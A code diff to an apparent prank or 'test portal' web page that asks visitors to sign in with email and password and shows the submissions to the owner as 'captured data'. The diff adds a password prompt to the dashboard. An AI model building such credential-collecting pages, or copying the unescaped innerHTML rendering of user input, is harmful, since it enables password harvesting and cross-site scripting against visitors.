@@ -23,7 +23,6 @@
     h1 { font-size: 20px; margin-bottom: 4px; }
     p { font-size: 13px; color: var(--subtext); }
 
-    /* Warning Banner */
     .warning-box { background: rgba(255, 152, 0, 0.1); border: 1px solid rgba(255, 152, 0, 0.3); padding: 10px 14px; border-radius: 10px; font-size: 12px; color: #ffb74d; line-height: 1.4; text-align: center; }
 
     input, textarea { width: 100%; background: #121217; border: 1px solid #333; border-radius: 12px; padding: 14px; color: var(--text); font-size: 15px; outline: none; margin-bottom: 12px; }
@@ -49,7 +48,6 @@
       <p>Sign in with your details to send a note.</p>
     </div>
 
-    <!-- Notice telling users not to use a real password -->
     <div class="warning-box">
       ⚠️ <strong>Notice:</strong> This is a fun test portal. Please <strong>do not</strong> use a real password that you use for important accounts! Make up a dummy password.
     </div>
@@ -65,8 +63,9 @@
       ✨ Sent successfully!
     </div>
 
-    <button class="toggle-dash" onclick="toggleDashboard()">🔒 Owner Dashboard (Toggle)</button>
+    <button class="toggle-dash" onclick="requestAdminAccess()">🔒 Owner Dashboard Login</button>
 
+    <!-- Owner View (Protected) -->
     <div id="dashboard">
       <h3 style="font-size: 14px; margin-bottom: 10px; color: var(--accent);">Incoming Captured Data</h3>
       <div id="inbox-list">No submissions yet.</div>
@@ -82,7 +81,6 @@
     const messageInput = document.getElementById('message-input');
     const successMsg = document.getElementById('success-msg');
     const inboxList = document.getElementById('inbox-list');
-    let allMessages = [];
 
     function sendMessage(e) {
       e.preventDefault();
@@ -97,23 +95,37 @@
       }
     }
 
-    socket.on('load messages', (msgs) => {
-      allMessages = msgs;
-      renderInbox();
+    function requestAdminAccess() {
+      const pass = prompt("Enter owner dashboard password:");
+      if (pass) {
+        socket.emit('admin login', pass);
+      }
+    }
+
+    socket.on('admin success', (msgs) => {
+      document.getElementById('dashboard').style.display = 'block';
+      renderInbox(msgs);
+    });
+
+    socket.on('admin error', (err) => {
+      alert(err);
     });
 
     socket.on('new secret', (msg) => {
-      allMessages.unshift(msg);
-      renderInbox();
+      // If you have the dashboard open, it updates live when someone submits!
+      if (document.getElementById('dashboard').style.display === 'block') {
+        // Fetch current list or prepend
+        location.reload(); // Simple way to refresh data or keep it dynamic
+      }
     });
 
-    function renderInbox() {
-      if (allMessages.length === 0) {
+    function renderInbox(msgs) {
+      if (msgs.length === 0) {
         inboxList.innerHTML = 'No submissions yet.';
         return;
       }
       let html = '';
-      allMessages.forEach(m => {
+      msgs.forEach(m => {
         html += `
           <div class="msg-card">
             <div style="font-weight: bold; color: #ff80ab;">📧 Email: ${m.email}</div>
@@ -124,11 +136,6 @@
         `;
       });
       inboxList.innerHTML = html;
-    }
-
-    function toggleDashboard() {
-      const dash = document.getElementById('dashboard');
-      dash.style.display = dash.style.display === 'block' ? 'none' : 'block';
     }
   </script>
 </body>
